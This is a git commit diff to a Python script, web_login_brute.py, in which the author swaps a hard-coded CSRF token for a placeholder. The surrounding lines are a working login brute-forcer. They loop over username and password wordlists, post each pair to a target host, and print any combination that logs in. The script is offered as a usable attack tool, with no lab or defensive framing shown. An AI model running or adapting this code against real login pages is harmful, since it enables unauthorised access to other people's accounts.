066af4e3e6f6eab78bd15c0bc09b0c81bd0867c7
rokkam <rokkam.vamshi@outlook.com>
2024-11-10 23:28:30 +0530

    web_login_brute.py file is edited. removed somehard coded values

--- web_login_brute.py
+++ web_login_brute.py
@@ -11,7 +11,7 @@ with open("ssh-common-usernames.txt","r") as username_list, open("ssh-common-pas
         username = username.strip("\n")
         print(f"[++++] Attempting to bruteforce for {username}")
         for password in password_list:
-            r = requests.post(Host, data={"_token":"04306cb3c7ab5cb2cba497.1Rec3usxGdkxD90KQ2LgpJUV3BgSuJ0gFblkq4-s5MM.sVDM7rp8IL5LfO5yLQOT191gi3ZVzKUXLYALnrjl1KKCWMPtqQh_oXlYiA","username":username,"password":password})
+            r = requests.post(Host, data={"_token":"Enter_Your_CSRF_Token_Here","username":username,"password":password})
             if valid_response.encode() in r.content:
                 print(f"[>>>>] Success! Valid combination --> '{username}:{password}'")
                 exit()
